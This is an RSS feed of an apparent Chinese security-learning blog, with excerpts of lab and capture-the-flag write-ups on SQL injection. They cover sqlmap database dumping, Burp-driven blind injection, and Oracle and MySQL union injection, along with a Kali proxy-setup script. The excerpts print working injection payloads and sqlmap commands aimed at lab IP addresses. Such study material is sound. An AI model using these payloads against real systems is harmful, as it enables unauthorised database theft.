<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on 备忘录</title>
    <link>https://xxxhidexxx.github.io/posts/</link>
    <description>Recent content in Posts on 备忘录</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>null</copyright>
    <lastBuildDate>Mon, 12 Feb 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://xxxhidexxx.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>熊海 CMS 后台登录的 SQL 注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
      <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
      <description>手工注入 用 sqlmap 扫描 使用的 sqlmap 语句如下。&amp;ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。&#xA;sqlmap -u http://111.9.41.91:53008/admin/?r=index --forms --batch --dbs&#xD;&amp;ndash;dbs 的意思是列出所有数据库名称&#xA;sqlmap -u http://111.9.41.91:53008/admin/?r=index --forms --batch -D flag_db --dump&#xD;-D 是指定数据库，&amp;ndash;dump 是以文件形式导出。</description>
    </item>
    <item>
      <title>Kali Linux 网络设置</title>
      <link>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</link>
      <pubDate>Sat, 10 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</guid>
      <description>连不上网的时候可以用如下指令。&#xA;dhclient -v&#xD;代理走本机的话可以用本机开 clash。&#xA;创建脚本。&#xA;#!/bin/bash&#xD;# encoding: utf-8&#xD;Proxy_IP=192.168.1.1&#xD;Proxy_Port=8080&#xD;# Set System Proxy&#xD;function xyon(){&#xD;export https_proxy=http://$Proxy_IP:$Proxy_Port&#xD;export http_proxy=http://$Proxy_IP:$Proxy_Port&#xD;export all_proxy=socks5://$Proxy_IP:$Proxy_Port&#xD;echo -e &amp;quot;System Proxy is $Proxy_IP:$Proxy_Port&amp;quot;&#xD;}&#xD;# unSet System Proxy&#xD;function xyoff(){&#xD;unset all_proxy&#xD;unset https_proxy&#xD;unset http_proxy&#xD;echo -e &amp;quot;System Proxy is Disabled&amp;quot;&#xD;}&#xD;# Default Function is Set Proxy&#xD;if [ $# != 0 ]&#xD;then&#xD;if [ $1 == &#39;off&#39; ]&#xD;then&#xD;xyoff&#xD;elif [ $1 == &#39;on&#39; ]&#xD;then&#xD;xyon&#xD;else&#xD;echo &amp;quot;Please Input on or off!</description>
    </item>
    <item>
      <title>用 Burp Suite 跑 MySQL 盲注</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli3/</link>
      <pubDate>Wed, 07 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli3/</guid>
      <description>提要 盲注就是存在注入点但是看不到回显点。这通常有两种情况，或者是输入 ?id=1&#39; and 1=2 --+ 能看到报错页面，或者是输入 ?id=1&#39; and sleep(3) --+ 回车能看到网页延迟刷新。这里 sleep(3) 延迟的不一定是三秒也可能是 3 的倍数，因为 sleep 可能被执行了不止一次。数据库一般都有延时函数，例如 mysql 的 sleep()，这种注入方法一般称为时间盲注。在页面没有任何明确显示的情况下，把响应时间作为一种显示，这个想法很有趣，然而，在现实场景中时间盲注成本比较高，运算量可能比较大，不是很稳定，除非一定要爆破，应该谨慎考虑这个选择。&#xA;我们这里主要演示的是用 burp 脚本进行爆破。如果手工注入的话语句的 = 改成 &amp;gt; 然后使用二分法就可以了，也没什么好讲的。&#xA;在做这个靶场的时候我们发现 burp 跑出来的时间盲注结果和自己手工测试的不一样。相同的测试语句，手工的结果是正确的，但是 burp 的响应时间比较抽象，还不知道原因。&#xA;用 burp 跑有报错的布尔盲注倒是很顺利，如下所述。&#xA;演示 还是用之前的靶场进行测试。首先用 &#39; and 1=2 --+ 找到注入点。看到页面报错。&#xA;打开 burp 抓包后发送到 intruder，选择集束炸弹。选中要遍历的参数之后点击添加 payload。我们两个的 payload 点位分别是 ascii 和字符串位数，所以类型都选择数值，ascii 我们直接从 1 跑到 128。&#xA;点击 attack 按钮之后可以看到响应包的长度有不同，比较长的就说明是正常显示的。我们把不报错的 ascii 码依次解码得到数据库名 webug。&#xA;然后可以进一步爆破表名和字段名找到 flag。语句的写法例如&#xA;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&amp;gt;1 --+&#xD;讲一下 sql 语法。这里的 substr 的用法是 substr(object,start,length) 所以 start 遍历 1~n，然后 length 永远写 1。这里 limit 0,1 的意思是从第 0 项开始查询 1 项，所以是第一个参数遍历 0~n，第二个参数恒为 1。</description>
    </item>
    <item>
      <title>Oracle 联合注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli2/</link>
      <pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli2/</guid>
      <description>靶场界面如下。&#xA;我们先确认一下参数 id 处存在注入点。&#xA;http://111.9.41.91:53109/?id=1&#39; or &#39;1&#39;=&#39;1&#xD;当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。&#xA;http://111.9.41.91:53109/?id=1&#39; order by 6 --+&#xD;我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。&#xA;先确认一下没有报错。&#xA;http://111.9.41.91:53109/?id=1&#39; union select null,null,null,null,null from dual --+&#xD;然后确认回显点的数据类型，我们只需要一个回显点就够了。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,&#39;a&#39;,null,null,null from dual --+&#xD;现在我们使用 oracle 的自带库。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,table_name,null,null,null from user_all_tables --+&#xD;我们找到了 flag 的表，进一步查询字段。&#xA;http://111.9.41.91:53109/?id=1&#39; union select 1,column_name,null,null,null from all_tab_columns where table_name=&#39;UNION_FLAG&#39; --+&#xD;至此我们就找到了 flag。</description>
    </item>
    <item>
      <title>MySQL 联合注入</title>
      <link>https://xxxhidexxx.github.io/posts/sec/sqli1/</link>
      <pubDate>Thu, 01 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://xxxhidexxx.github.io/posts/sec/sqli1/</guid>
      <description>对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&#xA;webug 4.0 的联合注入靶场界面如下。&#xA;首先在 id 参数之后加单引号进行尝试。&#xA;出现报错说明有注入点，这里甚至直接看到了 sql 语句。我们用 order by 猜测字段数，order by 2 正常，到 3 之后出现报错，说明有两个字段。&#xA;用联合查询查找回显点。&#xA;出现了一个回显点。那么我们可以直接爆出所有的库名和表名了。构造如下 poc&#xA;?id=-1&#39; union select null，group_concat(schema_name) from information_schema.schemata --+&#xD;可以看到如下显示。&#xA;至此这个靶场的 flag 就拿到了。</description>
    </item>
  </channel>
</rss>
